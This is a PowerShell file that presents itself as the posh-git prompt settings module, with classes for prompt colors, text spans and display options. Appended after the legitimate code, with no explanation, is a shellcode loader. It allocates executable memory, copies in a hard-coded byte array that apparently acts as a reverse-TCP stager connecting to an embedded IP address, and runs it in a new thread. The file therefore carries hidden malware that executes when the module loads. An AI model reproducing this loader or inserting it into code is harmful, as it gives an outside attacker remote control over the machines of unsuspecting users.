enum BranchBehindAndAheadDisplayOptions { Full; Compact; Minimal }enum UntrackedFilesMode { Default; No; Normal; All }class PoshGitCellColor {[psobject]$BackgroundColor[psobject]$ForegroundColorPoshGitCellColor() {$this.ForegroundColor = $null$this.BackgroundColor = $null}PoshGitCellColor([psobject]$ForegroundColor) {$this.ForegroundColor = $ForegroundColor$this.BackgroundColor = $null}PoshGitCellColor([psobject]$ForegroundColor, [psobject]$BackgroundColor) {$this.ForegroundColor = $ForegroundColor$this.BackgroundColor = $BackgroundColor}hidden [string] ToString($color) {$ansiTerm = "$([char]27)[0m"$colorSwatch = "  "$str = ""if (!$color) {$str = "<default>"}elseif (Test-VirtualTerminalSequece $color -Force) {if ($global:GitPromptSettings.AnsiConsole) {if ($color -eq $this.ForegroundColor) {$colorSwatch = "}$str = "${color}$colorSwatch${ansiTerm} "}$str = "`"$(EscapeAnsiString $color)`""}else {if ($global:GitPromptSettings.AnsiConsole) {$bg = Get-BackgroundVirtualTerminalSequence $color$str = "${bg}${colorSwatch}${ansiTerm} "}if ($color -is [int]) {$str += "0x{0:X6}" -f $color}else {$str += $color.ToString()}}return $str}[string] ToEscapedString() {if (!$global:GitPromptSettings.AnsiConsole) {return ""}$str = ""if ($this.ForegroundColor) {if (Test-VirtualTerminalSequece $this.ForegroundColor) {$str += EscapeAnsiString $this.ForegroundColor}else {$seq = Get-ForegroundVirtualTerminalSequence $this.ForegroundColor$str += EscapeAnsiString $seq}}if ($this.BackgroundColor) {if (Test-VirtualTerminalSequece $this.BackgroundColor) {$str += EscapeAnsiString $this.BackgroundColor}else {$seq = Get-BackgroundVirtualTerminalSequence $this.BackgroundColor$str += EscapeAnsiString $seq}}return $str}[string] ToString() {$str = "ForegroundColor: "$str += $this.ToString($this.ForegroundColor) + ", "$str += "BackgroundColor: "$str += $this.ToString($this.BackgroundColor)return $str}}class PoshGitTextSpan {[string]$Text[psobject]$BackgroundColor[psobject]$ForegroundColorPoshGitTextSpan() {$this.Text = ""$this.ForegroundColor = $null$this.BackgroundColor = $null}PoshGitTextSpan([string]$Text) {$this.Text = $Text$this.ForegroundColor = $null$this.BackgroundColor = $null}PoshGitTextSpan([string]$Text, [psobject]$ForegroundColor) {$this.Text = $Text$this.ForegroundColor = $ForegroundColor$this.BackgroundColor = $null}PoshGitTextSpan([string]$Text, [psobject]$ForegroundColor, [psobject]$BackgroundColor) {$this.Text = $Text$this.ForegroundColor = $ForegroundColor$this.BackgroundColor = $BackgroundColor}PoshGitTextSpan([PoshGitTextSpan]$PoshGitTextSpan) {$this.Text = $PoshGitTextSpan.Text$this.ForegroundColor = $PoshGitTextSpan.ForegroundColor$this.BackgroundColor = $PoshGitTextSpan.BackgroundColor}PoshGitTextSpan([PoshGitCellColor]$PoshGitCellColor) {$this.Text = ''$this.ForegroundColor = $PoshGitCellColor.ForegroundColor$this.BackgroundColor = $PoshGitCellColor.BackgroundColor}[PoshGitTextSpan] Expand() {if (!$this.Text) {return $this}$execContext = Get-Variable ExecutionContext -ValueOnly$expandedText = $execContext.SessionState.InvokeCommand.ExpandString($this.Text)$newTextSpan = [PoshGitTextSpan]::new($expandedText, $this.ForegroundColor, $this.BackgroundColor)return $newTextSpan}[string] ToAnsiString() {$reset = [System.Collections.Generic.List[string]]::new()$e = [char]27 + "["$fg = $this.ForegroundColorif (($null -ne $fg) -and !(Test-VirtualTerminalSequece $fg)) {$fg = Get-ForegroundVirtualTerminalSequence $fg$reset.Add('39')}$bg = $this.BackgroundColorif (($null -ne $bg) -and !(Test-VirtualTerminalSequece $bg)) {$bg = Get-BackgroundVirtualTerminalSequence $bg$reset.Add('49')}$txt = $this.Text$str = "${fg}${bg}${txt}"if (Test-VirtualTerminalSequece $txt -Force) {$reset.Clear()$reset.Add('0')}if ($reset.Count -gt 0) {$str += "${e}$($reset -join ';')m"}return $str}[string] ToEscapedString() {$str = EscapeAnsiString $this.ToAnsiString()return $str}[string] ToString() {$sep = " "if ($this.Text.Length -lt 2) {$sep = " " * (3 - $this.Text.Length)}if ($global:GitPromptSettings.AnsiConsole) {$txt = $this.ToAnsiString()if (Test-VirtualTerminalSequece $txt) {$escAnsi = "ANSI: `"$(EscapeAnsiString $txt)`""$str = "Text: `"$txt`",${sep}${escAnsi}"}else {$str = "Text: `"$txt`""}}else {$txt = $this.Textif (Test-VirtualTerminalSequece $txt -Force) {$txt = EscapeAnsiString $txt}$color = [PoshGitCellColor]::new($this.ForegroundColor, $this.BackgroundColor)$str = "Text: `"$txt`",${sep}$($color.ToString())"}return $str}}class PoshGitPromptSettings {[bool]$AnsiConsole = $Host.UI.SupportsVirtualTerminal -or ($Env:ConEmuANSI -eq "ON")[bool]$SetEnvColumns = $true[PoshGitCellColor]$DefaultColor = [PoshGitCellColor]::new()[PoshGitCellColor]$BranchColor  = [PoshGitCellColor]::new([ConsoleColor]::Cyan)[PoshGitCellColor]$IndexColor   = [PoshGitCellColor]::new([ConsoleColor]::DarkGreen)[PoshGitCellColor]$WorkingColor = [PoshGitCellColor]::new([ConsoleColor]::DarkRed)[PoshGitCellColor]$StashColor   = [PoshGitCellColor]::new([ConsoleColor]::Red)[PoshGitCellColor]$ErrorColor   = [PoshGitCellColor]::new([ConsoleColor]::Red)[PoshGitTextSpan]$PathStatusSeparator      = ' '[PoshGitTextSpan]$BeforeStatus             = [PoshGitTextSpan]::new('[', [ConsoleColor]::Yellow)[PoshGitTextSpan]$DelimStatus              = [PoshGitTextSpan]::new(' |', [ConsoleColor]::Yellow)[PoshGitTextSpan]$AfterStatus              = [PoshGitTextSpan]::new(']', [ConsoleColor]::Yellow)[PoshGitTextSpan]$BeforeIndex              = [PoshGitTextSpan]::new('', [ConsoleColor]::DarkGreen)[PoshGitTextSpan]$BeforeStash              = [PoshGitTextSpan]::new(' (', [ConsoleColor]::Red)[PoshGitTextSpan]$AfterStash               = [PoshGitTextSpan]::new(')', [ConsoleColor]::Red)[PoshGitTextSpan]$LocalDefaultStatusSymbol = [PoshGitTextSpan]::new('', [ConsoleColor]::DarkGreen)[PoshGitTextSpan]$LocalWorkingStatusSymbol = [PoshGitTextSpan]::new('!', [ConsoleColor]::DarkRed)[PoshGitTextSpan]$LocalStagedStatusSymbol  = [PoshGitTextSpan]::new('~', [ConsoleColor]::Cyan)[PoshGitTextSpan]$BranchGoneStatusSymbol           = [PoshGitTextSpan]::new([char]0x00D7, [ConsoleColor]::DarkCyan) [PoshGitTextSpan]$BranchIdenticalStatusSymbol      = [PoshGitTextSpan]::new([char]0x2261, [ConsoleColor]::Cyan)     [PoshGitTextSpan]$BranchAheadStatusSymbol          = [PoshGitTextSpan]::new([char]0x2191, [ConsoleColor]::Green)    [PoshGitTextSpan]$BranchBehindStatusSymbol         = [PoshGitTextSpan]::new([char]0x2193, [ConsoleColor]::Red)      [PoshGitTextSpan]$BranchBehindAndAheadStatusSymbol = [PoshGitTextSpan]::new([char]0x2195, [ConsoleColor]::Yellow)   [BranchBehindAndAheadDisplayOptions]$BranchBehindAndAheadDisplay = [BranchBehindAndAheadDisplayOptions]::Full[string]$FileAddedText       = '+'[string]$FileModifiedText    = '~'[string]$FileRemovedText     = '-'[string]$FileConflictedText  = '!'[string]$BranchUntrackedText = ''[bool]$EnableStashStatus     = $false[bool]$ShowStatusWhenZero    = $true[bool]$AutoRefreshIndex      = $true[UntrackedFilesMode]$UntrackedFilesMode = [UntrackedFilesMode]::Default[bool]$EnablePromptStatus    = !$global:GitMissing[bool]$EnableFileStatus      = $true[Nullable[bool]]$EnableFileStatusFromCache        = $null[string[]]$RepositoriesInWhichToDisableFileStatus = @()[string]$DescribeStyle = ''[psobject]$WindowTitle = {param($GitStatus, [bool]$IsAdmin) "$(if ($IsAdmin) {'Admin: '})$(if ($GitStatus) {"$($GitStatus.RepoName) [$($GitStatus.Branch)]"} else {Get-PromptPath}) ~ PowerShell $($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor) $(if ([IntPtr]::Size -eq 4) {'32-bit '})($PID)"}[PoshGitTextSpan]$DefaultPromptPrefix       = '$(Get-PromptConnectionInfo -Format "[{1}@{0}]: ")'[PoshGitTextSpan]$DefaultPromptPath         = '$(Get-PromptPath)'[PoshGitTextSpan]$DefaultPromptBeforeSuffix = ''[PoshGitTextSpan]$DefaultPromptDebug        = [PoshGitTextSpan]::new(' [DBG]:', [ConsoleColor]::Magenta)[PoshGitTextSpan]$DefaultPromptSuffix       = '$(">" * ($nestedPromptLevel + 1)) '[bool]$DefaultPromptAbbreviateHomeDirectory = $true[bool]$DefaultPromptWriteStatusFirst        = $false[bool]$DefaultPromptEnableTiming            = $false[PoshGitTextSpan]$DefaultPromptTimingFormat = ' {0}ms'[int]$BranchNameLimit = 0[string]$TruncatedBranchSuffix = '...'[bool]$Debug = $false}class PoshGitPromptValues {[int]$LastExitCode[bool]$DollarQuestion[bool]$IsAdmin[string]$LastPrompt}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xad,0xff,0xc5,0x8e,0x68,0x02,0x00,0x95,0x18,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};